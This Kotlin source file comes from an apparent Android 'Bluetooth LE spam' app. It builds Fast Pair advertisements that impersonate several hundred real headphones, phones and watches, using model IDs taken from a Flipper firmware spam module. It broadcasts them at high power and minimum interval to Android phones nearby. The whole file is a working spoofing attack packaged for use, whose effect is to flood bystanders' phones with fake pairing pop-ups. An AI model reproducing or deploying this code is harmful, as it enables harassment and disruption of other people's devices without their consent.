package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.le.AdvertisingSetParameters
import android.os.ParcelUuid
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ServiceData
import java.util.UUID

class FastPairDevicesAdvertisementSetGenerator:IAdvertisementSetGenerator{

    // Genuine Device Id's taken from here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/fastpair.c

    val _genuineDeviceIds = mapOf(
        "DAE096" to "adidas RPT-02 SOL",
        "A83C10" to "adidas Z.N.E. 01",
        "002000" to "AIAIAI TMA-2 (H60)",
        "9B7339" to "AKG N9 Hybrid",
        "202B3D" to "Amazfit PowerBuds",
        "070000" to "Android Auto",
        "470000" to "Arduino 101",
        "02D815" to "ATH-CK1TW",
        "1EE890" to "ATH-CKS30TW WH",
        "E6E771" to "ATH-CKS50TW",
        "CAB6B8" to "ATH-M20xBT",
        "9C3997" to "ATH-M50xBT2",
        "9939BC" to "ATH-SQ1TW",
        "D7102F" to "ATH-SQ1TW SVN",
        "CA7030" to "ATH-TWX7",
        "05AA91" to "B&O Beoplay E6",
        "91AA05" to "B&O Beoplay E6",
        "03AA91" to "B&O Beoplay H8i",
        "91AA03" to "B&O Beoplay H8i",
        "02AA91" to "B&O Earset",
        "91AA02" to "B&O Earset",
        "038F16" to "Beats Studio Buds",
        "00AA91" to "Beoplay E8 2.0",
        "91AA00" to "Beoplay E8 2.0",
        "D6E870" to "Beoplay EX",
        "04AA91" to "Beoplay H4",
        "91AA04" to "Beoplay H4",
        "01AA91" to "Beoplay H9 3rd Generation",
        "91AA01" to "Beoplay H9 3rd Generation",
        "109201" to "Beoplay H9 3rd Generation",
        "DF271C" to "Big Bang e Gen 3",
        "532011" to "Big Bang e Gen 3",
        "DA5200" to "blackbox TRIP II",
        "0052DA" to "blackbox TRIP II",
        "124366" to "BLE-Phone",
        "8D13B9" to "BLE-TWS",
        "00A168" to "boAt  Airdopes 621",
        "1F5865" to "boAt Airdopes 441",
        "641630" to "boAt Airdopes 452",
        "8E5550" to "boAt Airdopes 511v2",
        "21521D" to "boAt Rockerz 355 (Green)",
        "CD8256" to "Bose NC 700",
        "A7E52B" to "Bose NC 700 Headphones",
        "CD8256" to "Bose NC 700 Headphones",
        "DF9BA4" to "Bose NC 700 Headphones",
        "5BACD6" to "Bose QC Ultra Earbuds",
        "8A31B7" to "Bose QC Ultra Headphones",
        "0000F0" to "Bose QuietComfort 35 II",
        "F00000" to "Bose QuietComfort 35 II",
        "F00001" to "Bose QuietComfort 35 II",
        "0100F0" to "Bose QuietComfort 35 II",
        "F00000" to "Bose QuietComfort 35 II 2",
        "DADE43" to "Chromebox",
        "013D8A" to "Cleer EDGE Voice",
        "8A3D01" to "Cleer EDGE Voice",
        "8A3D00" to "Cleer FLOW Ⅱ",
        "003D8A" to "Cleer FLOW Ⅱ",
        "003D8A" to "Cleer FLOW II",
        "D7E3EB" to "Cleer HALO",
        "0F0993" to "COUMI TWS-834A",
        "038B91" to "DENON AH-C830NCW",
        "213C8C" to "DIZO Wireless Power",
        "DEE8C0" to "Ear (2)",
        "9CE3C7" to "EDIFIER NeoBuds Pro 2",
        "994374" to "EDIFIER W320TN",
        "0DEC2B" to "Emporio Armani EA Connected",
        "C7A267" to "Fake Test Mouse",
        "480000" to "Fast Pair Headphones",
        "490000" to "Fast Pair Headphones",
        "000049" to "Fast Pair Headphones",
        "5CEE3C" to "Fitbit Charge 4",
        "080000" to "Foocorp Foophones",
        "915CFA" to "Galaxy A14",
        "89BAD5" to "Galaxy A23 5G",
        "8E1996" to "Galaxy A24 5g",
        "A8CAAD" to "Galaxy F04",
        "8D16EA" to "Galaxy M14 5G",
        "9D7D42" to "Galaxy S20",
        "E4E457" to "Galaxy S20 5G",
        "06AE20" to "Galaxy S21 5G",
        "99F098" to "Galaxy S22 Ultra",
        "8C4236" to "GLIDiC mameBuds",
        "0B0000" to "Google Gphones",
        "0C0000" to "Google Gphones",
        "00000C" to "Google Gphones",
        "000006" to "Google Pixel buds",
        "060000" to "Google Pixel Buds",
        "000006" to "Google Pixel Buds",
        "060000" to "Google Pixel buds 2",
        "9B9872" to "Hyundai",
        "DAD3A6" to "Jabra Elite 10",
        "00AA48" to "Jabra Elite 2",
        "1F2E13" to "Jabra Elite 2",
        "1F4589" to "Jabra Elite 2",
        "9101F0" to "Jabra Elite 2",
        "6BA5C3" to "Jabra Elite 4",
        "8C07D2" to "Jabra Elite 4 Active",
        "DA4577" to "Jabra Elite 4 Active",
        "8B0A91" to "Jabra Elite 5",
        "D5A59E" to "Jabra Elite Speaker",
        "9171BE" to "Jabra Evolve2 65 Flex",
        "C79B91" to "Jabra Evolve2 75",
        "E750CE" to "Jabra Evolve2 75",
        "C8777E" to "Jaybird Vista 2",
        "CAF511" to "Jaybird Vista 2",
        "F52494" to "JBL Buds Pro",
        "A8001A" to "JBL CLUB ONE",
        "A7EF76" to "JBL CLUB PRO+ TWS",
        "D933A7" to "JBL ENDURANCE PEAK 3",
        "C85D7A" to "JBL ENDURANCE PEAK II",
        "A8F96D" to "JBL ENDURANCE RUN 2 WIRELESS",
        "0002F0" to "JBL Everest 110GA",
        "F00201" to "JBL Everest 110GA",
        "F00200" to "JBL Everest 110GA",
        "F00202" to "JBL Everest 110GA",
        "0102F0" to "JBL Everest 110GA",
        "0202F0" to "JBL Everest 110GA",
        "0102F0" to "JBL Everest 110GA - Gun Metal",
        "0202F0" to "JBL Everest 110GA - Silver",
        "F00204" to "JBL Everest 310GA",
        "F00205" to "JBL Everest 310GA",
        "F00206" to "JBL Everest 310GA",
        "F00203" to "JBL Everest 310GA",
        "0602F0" to "JBL Everest 310GA",
        "0302F0" to "JBL Everest 310GA",
        "0402F0" to "JBL Everest 310GA",
        "0502F0" to "JBL Everest 310GA",
        "0302F0" to "JBL Everest 310GA - Brown",
        "0402F0" to "JBL Everest 310GA - Gun Metal",
        "0502F0" to "JBL Everest 310GA - Silver",
        "F00208" to "JBL Everest 710GA",
        "F00207" to "JBL Everest 710GA",
        "0702F0" to "JBL Everest 710GA",
        "0802F0" to "JBL Everest 710GA",
        "0702F0" to "JBL Everest 710GA - Gun Metal",
        "0802F0" to "JBL Everest 710GA - Silver",
        "821F66" to "JBL Flip 6",
        "071C74" to "JBL Flip 6",
        "5BE3D4" to "JBL Flip 6",
        "718FA4" to "JBL Live 300TWS",
        "02F637" to "JBL LIVE FLEX",
        "6C4DE5" to "JBL LIVE PRO 2 TWS",
        "8CB05C" to "JBL LIVE PRO+ TWS",
        "C6936A" to "JBL LIVE PRO+ TWS",
        "F52494" to "JBL LIVE PRO+ TWS",
        "05C452" to "JBL LIVE220BT",
        "5C8AA5" to "JBL LIVE220BT",
        "A90358" to "JBL LIVE220BT",
        "718FA4" to "JBL LIVE300TWS",
        "F00209" to "JBL LIVE400BT",
        "F0020A" to "JBL LIVE400BT",
        "F0020B" to "JBL LIVE400BT",
        "F0020C" to "JBL LIVE400BT",
        "F0020D" to "JBL LIVE400BT",
        "F0020F" to "JBL LIVE500BT",
        "F0020E" to "JBL LIVE500BT",
        "F00212" to "JBL LIVE500BT",
        "F00211" to "JBL LIVE500BT",
        "F00210" to "JBL LIVE500BT",
        "F00213" to "JBL LIVE650BTNC",
        "F00214" to "JBL LIVE650BTNC",
        "F00215" to "JBL LIVE650BTNC",
        "A8A72A" to "JBL LIVE670NC",
        "0660D7" to "JBL LIVE770NC",
        "C7D620" to "JBL Pulse 5",
        "DFD433" to "JBL REFLECT AERO",
        "E69877" to "JBL REFLECT AERO",
        "02D886" to "JBL REFLECT MINI NC",
        "1FF8FA" to "JBL REFLECT MINI NC",
        "DCF33C" to "JBL REFLECT MINI NC",
        "9B735A" to "JBL RFL FLOW PRO",
        "D9414F" to "JBL SOUNDGEAR SENSE",
        "664454" to "JBL TUNE 520BT",
        "04AFB8" to "JBL TUNE 720BT",
        "A8E353" to "JBL TUNE BEAM",
        "E09172" to "JBL TUNE BEAM",
        "0F232A" to "JBL TUNE BUDS",
        "054B2D" to "JBL TUNE125TWS",
        "D97EBA" to "JBL TUNE125TWS",
        "5BD6C9" to "JBL TUNE225TWS",
        "5C0C84" to "JBL TUNE225TWS",
        "9BC64D" to "JBL TUNE225TWS",
        "9C98DB" to "JBL TUNE225TWS",
        "A9394A" to "JBL TUNE230NC TWS",
        "A8C636" to "JBL TUNE660NC",
        "CC5F29" to "JBL TUNE660NC",
        "D9964B" to "JBL TUNE670NC",
        "038CC7" to "JBL TUNE760NC",
        "02DD4F" to "JBL TUNE770NC",
        "91C813" to "JBL TUNE770NC",
        "F00E97" to "JBL VIBE BEAM",
        "0F1B8D" to "JBL VIBE BEAM",
        "9C0AF7" to "JBL VIBE BUDS",
        "C7FBCC" to "JBL VIBE FLEX",
        "04ACFC" to "JBL WAVE BEAM",
        "E64613" to "JBL WAVE BEAM",
        "A92498" to "JBL WAVE BUDS",
        "549547" to "JBL WAVE BUDS",
        "1ED9F9" to "JBL WAVE FLEX",
        "9C4058" to "JBL WAVE FLEX",
        "C9836A" to "JBL Xtreme 4",
        "D654CD" to "JBL Xtreme 4",
        "9CF08F" to "JLab Epic Air ANC",
        "8AADAE" to "JLab GO Work 2",
        "8CAD81" to "KENWOOD WS-A1",
        "F00304" to "LG HBS-1010",
        "0403F0" to "LG HBS-1010",
        "F00307" to "LG HBS-1120",
        "0703F0" to "LG HBS-1120",
        "F00308" to "LG HBS-1125",
        "0803F0" to "LG HBS-1125",
        "F00305" to "LG HBS-1500",
        "0503F0" to "LG HBS-1500",
        "F00306" to "LG HBS-1700",
        "0603F0" to "LG HBS-1700",
        "F00309" to "LG HBS-2000",
        "0903F0" to "LG HBS-2000",
        "F00302" to "LG HBS-830",
        "0203F0" to "LG HBS-830",
        "F00301" to "LG HBS-835",
        "0103F0" to "LG HBS-835",
        "0003F0" to "LG HBS-835S",
        "F00300" to "LG HBS-835S",
        "F00303" to "LG HBS-930",
        "0303F0" to "LG HBS-930",
        "91BD38" to "LG HBS-FL7",
        "9AEEA4" to "LG HBS-FN4",
        "D6C195" to "LG HBS-SL5",
        "9CD0F3" to "LG HBS-TFN7",
        "5C4A7E" to "LG HBS-XL7",
        "DB8AC7" to "LG TONE-FREE",
        "92255E" to "LG-TONE-FP6",
        "625740" to "LG-TONE-NP3",
        "8E14D7" to "LG-TONE-TFP8",
        "003000" to "Libratone Q Adapt On-Ear",
        "003001" to "Libratone Q Adapt On-Ear",
        "003001" to "Libratone Q Adapt On-Ear 2",
        "917E46" to "LinkBuds",
        "861698" to "LinkBuds",
        "1F181A" to "LinkBuds S",
        "9C6BC0" to "LinkBuds S",
        "C8162A" to "LinkBuds S",
        "E06116" to "LinkBuds S",
        "003B41" to "M&D MW65",
        "050F0C" to "Major III Voice",
        "039F8F" to "Michael Kors Darci 5e",
        "CCBB7E" to "MIDDLETON",
        "052CC7" to "MINOR III",
        "D8058C" to "MOTIF II A.N.C.",
        "596007" to "MOTIF II A.N.C.",
        "9A408A" to "MOTO BUDS 065",
        "03C99C" to "MOTO BUDS 135",
        "D5B5F7" to "MOTO BUDS 600 ANC",
        "0DC6BF" to "My Awesome Device II",
        "07F426" to "Nest Hub Max",
        "011242" to "Nirvana Ion",
        "855347" to "NIRVANA NEBULA",
        "A8A00E" to "Nokia CB-201",
        "6B9304" to "Nokia SB-101",
        "8BB0A0" to "Nokia Solo Bud+",
        "8E4666" to "Oladance Wearable Stereo",
        "E57363" to "Oladance Wearable Stereo",
        "8BF79A" to "Oladance Whisper E1",
        "E07634" to "OnePlus Buds Z",
        "06C197" to "OPPO Enco Air3 Pro",
        "DD4EC0" to "OPPO Enco Air3 Pro",
        "6B8C65" to "oraimo FreePods 4",
        "A8845A" to "oraimo FreePods 4",
        "21A04E" to "oraimo FreePods Pro",
        "614199" to "Oraimo FreePods Pro",
        "99D7EA" to "oraimo OpenCirclet",
        "005BC3" to "Panasonic RP-HD610N",
        "D65F4E" to "Philips Fidelio T2",
        "C7736C" to "Philips PH805",
        "0ECE95" to "Philips TAT3508",
        "00FA72" to "Pioneer SE-MS9BN",
        "8D5B67" to "Pixel 90c",
        "92BBBD" to "Pixel Buds",
        "0582FD" to "Pixel Buds",
        "6B1C64" to "Pixel Buds",
        "8B66AB" to "Pixel Buds A-Series",
        "9ADB11" to "Pixel Buds Pro",
        "C8E228" to "Pixel Buds Pro",
        "D87A3E" to "Pixel Buds Pro",
        "567679" to "Pixel Buds Pro",
        "035754" to "Plantronics PLT_K2",
        "045754" to "Plantronics PLT_K2",
        "284500" to "Plantronics PLT_K2",
        "035764" to "PLT V8200 Series",
        "045764" to "PLT V8200 Series",
        "E6E8B8" to "POCO Pods",
        "0E30C3" to "Razer Hammerhead TWS",
        "72EF8D" to "Razer Hammerhead TWS X",
        "E6E37E" to "realme Buds  Air 5 Pro",
        "8C6B6A" to "realme Buds Air 3S",
        "8CD10F" to "realme Buds Air Pro",
        "D8F4E8" to "realme Buds T100",
        "D5C6CE" to "realme TechLife Buds T100",
        "D6EE84" to "Rockerz 255 Max",
        "A8658F" to "ROCKSTER GO",
        "989D0A" to "Set up your new Pixel 2",
        "E64CC6" to "Set up your new Pixel 3 XL",
        "00C95C" to "Sony WF-1000X",
        "01C95C" to "Sony WF-1000X",
        "5CC900" to "Sony WF-1000X",
        "5CC901" to "Sony WF-1000X",
        "5CC938" to "Sony WF-1000XM3",
        "5CC939" to "Sony WF-1000XM3",
        "5CC93A" to "Sony WF-1000XM3",
        "5CC93B" to "Sony WF-1000XM3",
        "2D7A23" to "Sony WF-1000XM4",
        "1EC95C" to "Sony WF-SP700N",
        "1FC95C" to "Sony WF-SP700N",
        "20C95C" to "Sony WF-SP700N",
        "5CC91E" to "Sony WF-SP700N",
        "5CC91F" to "Sony WF-SP700N",
        "5CC920" to "Sony WF-SP700N",
        "5CC921" to "Sony WF-SP700N",
        "5CC922" to "Sony WF-SP700N",
        "5CC923" to "Sony WF-SP700N",
        "5CC924" to "Sony WF-SP700N",
        "5CC925" to "Sony WF-SP700N",
        "5CC926" to "Sony WF-SP700N",
        "5CC927" to "Sony WF-SP700N",
        "02C95C" to "Sony WH-1000XM2",
        "03C95C" to "Sony WH-1000XM2",
        "06C95C" to "Sony WH-1000XM2",
        "07C95C" to "Sony WH-1000XM2",
        "5CC902" to "Sony WH-1000XM2",
        "5CC903" to "Sony WH-1000XM2",
        "5CC906" to "Sony WH-1000XM2",
        "5CC907" to "Sony WH-1000XM2",
        "0DC95C" to "Sony WH-1000XM3",
        "5CC90A" to "Sony WH-1000XM3",
        "5CC90B" to "Sony WH-1000XM3",
        "5CC90C" to "Sony WH-1000XM3",
        "5CC90D" to "Sony WH-1000XM3",
        "706908" to "Sony WH-1000XM3",
        "837980" to "Sony WH-1000XM3",
        "5CC932" to "Sony WH-CH700N",
        "5CC933" to "Sony WH-CH700N",
        "5CC934" to "Sony WH-CH700N",
        "5CC935" to "Sony WH-CH700N",
        "5CC936" to "Sony WH-CH700N",
        "5CC937" to "Sony WH-CH700N",
        "5CC928" to "Sony WH-H900N",
        "5CC929" to "Sony WH-H900N",
        "5CC92A" to "Sony WH-H900N",
        "5CC92B" to "Sony WH-H900N",
        "5CC92C" to "Sony WH-H900N",
        "5CC92D" to "Sony WH-H900N",
        "5CC92E" to "Sony WH-H900N",
        "5CC92F" to "Sony WH-H900N",
        "5CC930" to "Sony WH-H900N",
        "5CC931" to "Sony WH-H900N",
        "5CC93C" to "Sony WH-XB700",
        "5CC93D" to "Sony WH-XB700",
        "5CC93E" to "Sony WH-XB700",
        "5CC93F" to "Sony WH-XB700",
        "5CC940" to "Sony WH-XB900N",
        "5CC941" to "Sony WH-XB900N",
        "5CC942" to "Sony WH-XB900N",
        "5CC943" to "Sony WH-XB900N",
        "5CC944" to "Sony WH-XB900N",
        "5CC945" to "Sony WH-XB900N",
        "05C95C" to "Sony WI-1000X",
        "04C95C" to "Sony WI-1000X",
        "5CC904" to "Sony WI-1000X",
        "5CC905" to "Sony WI-1000X",
        "5CC908" to "Sony WI-1000X",
        "5CC909" to "Sony WI-1000X",
        "575836" to "Sony WI-1000X",
        "641372" to "Sony WI-1000X",
        "0EC95C" to "Sony WI-C600N",
        "5CC90E" to "Sony WI-C600N",
        "5CC90F" to "Sony WI-C600N",
        "5CC910" to "Sony WI-C600N",
        "5CC911" to "Sony WI-C600N",
        "5CC912" to "Sony WI-C600N",
        "5CC913" to "Sony WI-C600N",
        "5CC914" to "Sony WI-SP600N",
        "5CC915" to "Sony WI-SP600N",
        "5CC916" to "Sony WI-SP600N",
        "5CC917" to "Sony WI-SP600N",
        "5CC918" to "Sony WI-SP600N",
        "5CC919" to "Sony WI-SP600N",
        "5CC91A" to "Sony WI-SP600N",
        "5CC91B" to "Sony WI-SP600N",
        "5CC91C" to "Sony WI-SP600N",
        "5CC91D" to "Sony WI-SP600N",
        "D446A7" to "Sony XM5",
        "CB529D" to "soundcore Glow",
        "008F7D" to "soundcore Glow Mini",
        "06D8FC" to "soundcore Liberty 4 NC",
        "9CB881" to "soundcore Motion 300",
        "E020C1" to "soundcore Motion 300",
        "CB2FE7" to "soundcore Motion X500",
        "DEDD6F" to "soundcore Space One",
        "72FB00" to "Soundcore Spirit Pro GVA",
        "DA0F83" to "SPACE",
        "DF4B02" to "SRS-XB13",
        "20330C" to "SRS-XB33",
        "91DABC" to "SRS-XB33",
        "E5B91B" to "SRS-XB33",
        "1E8B18" to "SRS-XB43",
        "20CC2C" to "SRS-XB43",
        "C6EC5F" to "SRS-XE300",
        "1F4627" to "SRS-XG300",
        "9CEFD1" to "SRS-XG500",
        "C878AA" to "SRS-XV800",
        "201C7C" to "SUMMIT",
        "DEC04C" to "SUMMIT",
        "E57B57" to "Super Device",
        "CC93A5" to "Sync",
        "DF01E3" to "Sync",
        "DF42DE" to "TAG Heuer Calibre E4 42mm",
        "1F1101" to "TAG Heuer Calibre E4 45mm",
        "E5440B" to "TAG Heuer Calibre E4 45mm",
        "9128CB" to "TCL MOVEAUDIO Neo",
        "02E2A9" to "TCL MOVEAUDIO S200",
        "5C55E7" to "TCL MOVEAUDIO S200",
        "0744B6" to "Technics EAH-AZ60M2",
        "0A0000" to "Test 00000a - Anti-Spoofing",
        "00000A" to "Test 00000a - Anti-Spoofing",
        "350000" to "Test 000035",
        "090000" to "Test Android TV",
        "DE577F" to "Teufel AIRY TWS 2",
        "1EEDF5" to "Teufel REAL BLUE TWS 3",
        "6AD226" to "TicWatch Pro 3",
        "8B5A7B" to "TicWatch Pro 3 GPS",
        "057802" to "TicWatch Pro 5",
        "D69B2B" to "TONE-T80S",
        "1FE765" to "TONE-TF7Q",
        "6C42C0" to "TWS05",
        "997B4A" to "UA | JBL True Wireless Flash X",
        "C6ABEA" to "UA | JBL True Wireless Flash X",
        "5C0206" to "UA | JBL TWS STREAK",
        "9D00A6" to "Urbanears Juno",
        "CB093B" to "Urbanears Juno",
        "2D7A23" to "WF-1000XM4",
        "C8D335" to "WF-1000XM4",
        "C9186B" to "WF-1000XM4",
        "DBE5B1" to "WF-1000XM4",
        "8A8F23" to "WF-1000XM5",
        "E5B4B0" to "WF-1000XM5",
        "DE215D" to "WF-C500",
        "1FBB50" to "WF-C700N",
        "07A41C" to "WF-C700N",
        "C69AFD" to "WF-H800 (h.ear)",
        "0E138D" to "WF-SP800N",
        "20A19B" to "WF-SP800N",
        "5BA9B5" to "WF-SP800N",
        "A88B69" to "WF-SP800N",
        "01EEB4" to "WH-1000XM4",
        "058D08" to "WH-1000XM4",
        "CC438E" to "WH-1000XM4",
        "126644" to "WH-1000XM4",
        "5C7CDC" to "WH-1000XM5",
        "9CB5F3" to "WH-1000XM5",
        "D446A7" to "WH-1000XM5",
        "D8F3BA" to "WH-1000XM5",
        "0F2D16" to "WH-CH520",
        "5C4833" to "WH-CH720N",
        "99C87B" to "WH-H810 (h.ear)",
        "DC5249" to "WH-H810 (h.ear)",
        "DEF234" to "WH-H810 (h.ear)",
        "9C888B" to "WH-H910N (h.ear)",
        "9A9BDD" to "WH-XB910N",
        "D820EA" to "WH-XB910N",
        "1E955B" to "WI-1000XM2",
        "9BE931" to "WI-C100",
        "05A963" to "WONDERBOOM 3",
        "03F5D4" to "Writing Account Key",
        "DEEA86" to "Xiaomi Buds 4 Pro",
        "D90617" to "Xiaomi Redmi Buds 4 Active",
        "C8C641" to "Xiaomi Redmi Buds 4 Lite",
        "612907" to "Xiaomi Redmi Buds 4 Lite",
        "913B0C" to "YH-E700B",
        "9DB896" to "Your BMW",
        "03B716" to "YY2963",
        "9CA277" to "YY2963",
        "CC754F" to "YY2963",
        "8C1706" to "YY7861E",
        "E5E2E9" to "Zone Wireless 2"
        )


    val serviceUuid = ParcelUuid(UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))

    override fun getAdvertisementSets():List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _genuineDeviceIds.map {

            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_ANDROID
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_FAST_PAIRING_DEVICE
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val serviceData = ServiceData()
            serviceData.serviceUuid = serviceUuid
            serviceData.serviceData = StringHelpers.decodeHex(it.key)
            advertisementSet.advertiseData.services.add(serviceData)
            advertisementSet.advertiseData.includeTxPower = true

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = true

            // General Data
            advertisementSet.title = it.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}